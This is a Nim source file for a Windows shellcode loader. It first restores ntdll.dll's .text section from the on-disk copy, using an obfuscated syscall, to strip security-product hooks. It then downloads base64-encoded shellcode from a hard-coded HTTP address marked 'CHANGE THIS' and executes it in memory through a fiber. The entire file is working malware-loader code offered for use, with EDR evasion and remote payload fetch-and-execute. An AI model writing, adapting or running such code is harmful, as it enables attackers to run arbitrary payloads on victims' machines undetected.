import winim

import std/httpclient
import std/strutils
import std/strformat
import std/base64

include syscalls

import ptr_math




proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)


# the code below courtesy of byt3bl33d3r, adapted to use syscalls
proc ntdll_mapviewoffile() =
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA("ntdll.dll")
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll


  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  

  if ntdllMapping == 0:
    echo fmt"Could not create file mapping object ({GetLastError()})."
    return
  

  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo fmt"Could not map view of file ({GetLastError()})."
    return


  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection : DWORD = 0
          var text_addr : LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
          var sectionSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)

          var status = CoapyfCqWjDhcIOb(processH, addr text_addr, &sectionSize, PAGE_EXECUTE_READWRITE, addr oldProtection)
          echo "[*] CoapyfCqWjDhcIOb(RWX): ", RtlNtStatusToDosError(status)
          copyMem(text_addr, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          status = CoapyfCqWjDhcIOb(processH, addr text_addr, &sectionSize, oldProtection, addr oldProtection)
          echo "[*] CoapyfCqWjDhcIOb(oldprotect): ", RtlNtStatusToDosError(status)


  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)
          


proc run() =

  ntdll_mapviewoffile()

  var client = newHttpClient()
  var encodedShellcode =  client.getContent("http://192.168.31.151/msgbox3.bin.html") # CHANGE THIS
  

  var shellcodeString: string
  for ch in encodedShellcode:
    if isAlphaNumeric(ch):
      shellcodeString.add(ch)
    elif ch == '_': # nim literally cannot decode urlsafe base64
      shellcodeString.add('/')
    elif ch == '-':
      shellcodeString.add('+')
  
  shellcodeString = shellcodeString[4 .. shellcodeString.len - 5]

  if len(shellcodeString) mod 4 > 0: # adjust for missing padding
    shellcodeString &= repeat('=', 4 - len(shellcodeString) mod 4)
  
  var shellcode = newseq[byte]()
  
  shellcodeString = decode(shellcodeString)

  for ch in shellcodeString:  
    shellcode.add(cast[byte](ch))
  
  
  
  var mainFiber = ConvertThreadToFiber(nil)
  var shellcodeLocation = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE);
  
  CopyMemory(shellcodeLocation, &shellcode[0], shellcode.len);
  var shellcodeFiber = CreateFiber(cast[SIZE_T](0), cast[LPFIBER_START_ROUTINE](shellcodeLocation), NULL);
  var oldprotect: ULONG
  VirtualProtect(shellcodeLocation, cast[SIZE_T](shellcode.len), PAGE_EXECUTE_READ, &oldprotect)
  
  
  SwitchToFiber(shellcodeFiber);


when isMainModule:
  run()